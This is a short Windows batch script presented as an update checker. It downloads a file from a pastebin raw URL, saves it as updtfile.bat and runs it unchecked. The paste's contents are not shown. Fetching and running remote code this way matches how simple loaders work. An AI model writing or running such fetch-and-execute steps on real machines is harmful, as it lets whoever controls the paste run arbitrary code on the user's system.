@echo off
set "UpdateFileName=updtfile.bat"
set version=1.0

:updatecheck
download https://pastebin.com/raw/f0rFGadA updtfile.bat
ping localhost -n 5 >nul
cls
IF EXIST %UpdateFileName% (
call %UpdateFileName%
) else (
cls
echo There was an error while trying to start.
pause
)
